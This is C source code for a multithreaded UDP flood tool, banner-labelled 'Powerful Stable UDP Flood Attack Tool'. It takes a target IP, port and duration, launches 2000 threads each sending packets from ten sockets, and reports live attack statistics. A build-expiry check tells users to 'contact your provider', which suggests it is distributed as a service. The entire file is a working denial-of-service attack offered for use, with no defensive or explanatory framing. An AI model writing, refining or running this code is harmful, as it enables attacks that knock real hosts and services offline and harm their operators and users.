#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <pthread.h>
#include <stdatomic.h>

#define EXPIRY_DATE "2026-12-31"
#define PACKET_SIZE 1024    // Payload size in bytes
#define MAX_SOCKETS 10      // Number of sockets per thread
#define THREAD_COUNT 2000   // Number of threads

atomic_ulong data_sent_bytes = 0;
atomic_ulong packet_sent_count = 0;

typedef struct {
    char ip[16];
    int port;
    int duration;
} AttackParams;

// Check if build expired based on EXPIRY_DATE
int is_expired() {
    int y, m, d;
    sscanf(EXPIRY_DATE, "%d-%d-%d", &y, &m, &d);
    time_t now = time(NULL);
    struct tm *cur = localtime(&now);
    return (cur->tm_year + 1900 > y ||
           (cur->tm_year + 1900 == y && cur->tm_mon + 1 > m) ||
           (cur->tm_year + 1900 == y && cur->tm_mon + 1 == m && cur->tm_mday > d));
}

// Print a colorful banner
void print_banner() {
    printf("\033[1;35m===============================================\033[0m\n");
    printf("\033[1;32m     Powerful Stable UDP Flood Attack Tool     \033[0m\n");
    printf("\033[1;33m           Expiry Date: %s           \033[0m\n", EXPIRY_DATE);
    printf("\033[1;35m===============================================\033[0m\n\n");
}

// Create a non-blocking UDP socket
int create_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;
    fcntl(sock, F_SETFL, O_NONBLOCK);
    return sock;
}

// Thread function to send UDP packets continuously until duration expires
void* send_udp_packets(void* arg) {
    AttackParams *params = (AttackParams *)arg;
    struct sockaddr_in addr;
    char payload[PACKET_SIZE];
    memset(payload, 'X', PACKET_SIZE);

    addr.sin_family = AF_INET;
    addr.sin_port = htons(params->port);
    inet_pton(AF_INET, params->ip, &addr.sin_addr);

    int sockets[MAX_SOCKETS];
    // Initialize sockets
    for (int i = 0; i < MAX_SOCKETS; i++) {
        sockets[i] = create_socket();
        if (sockets[i] < 0) {
            // Try again later or handle error, but for now just skip
            sockets[i] = -1;
        }
    }

    time_t start = time(NULL);
    while (time(NULL) - start < params->duration) {
        for (int i = 0; i < MAX_SOCKETS; i++) {
            // If socket is invalid, recreate it
            if (sockets[i] < 0) {
                sockets[i] = create_socket();
                if (sockets[i] < 0) continue;  // failed again, skip this iteration
            }
            ssize_t sent = sendto(sockets[i], payload, PACKET_SIZE, 0, (struct sockaddr *)&addr, sizeof(addr));
            if (sent < 0) {
                // If send fails, close socket and mark as invalid to recreate
                close(sockets[i]);
                sockets[i] = -1;
                continue;
            }
            atomic_fetch_add(&data_sent_bytes, PACKET_SIZE);
            atomic_fetch_add(&packet_sent_count, 1);
        }
    }

    // Cleanup all sockets on exit
    for (int i = 0; i < MAX_SOCKETS; i++) {
        if (sockets[i] >= 0) close(sockets[i]);
    }

    pthread_exit(NULL);
}

// Thread function to display live attack stats
void* display_live_stats(void* arg) {
    int duration = *(int*)arg;

    for (int remaining = duration; remaining > 0; remaining--) {
        sleep(1);
        double gb_sent = atomic_load(&data_sent_bytes) / (1024.0 * 1024.0 * 1024.0);
        unsigned long pkts = atomic_load(&packet_sent_count);
        double speed_mbps = (gb_sent * 1024 * 8) / (duration - remaining + 1);

        printf("\r\033[1;36m[ LIVE STATS ] Time Left: %3d sec | Data Sent: %.2f GB | Packets: %-10lu | Speed: %.2f Mbps\033[0m",
               remaining, gb_sent, pkts, speed_mbps);
        fflush(stdout);
    }

    printf("\r\033[1;32m[ ATTACK DONE  ] Total Sent: %.2f GB | Packets: %lu\n\033[0m",
           atomic_load(&data_sent_bytes) / (1024.0 * 1024.0 * 1024.0),
           atomic_load(&packet_sent_count));
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <Port> <Time in seconds>\n", argv[0]);
        return 1;
    }

    if (is_expired()) {
        fprintf(stderr, "\033[1;31mERROR: This build has expired. Contact your provider.\033[0m\n");
        return 1;
    }

    print_banner();

    AttackParams params;
    strncpy(params.ip, argv[1], sizeof(params.ip) - 1);
    params.ip[sizeof(params.ip) - 1] = '\0';
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t stat_thread;
    pthread_create(&stat_thread, NULL, display_live_stats, &params.duration);

    pthread_t threads[THREAD_COUNT];
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_create(&threads[i], NULL, send_udp_packets, &params);
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_join(stat_thread, NULL);

    printf("\033[1;34mAttack finished. Stay powerful.\033[0m\n");
    return 0;
}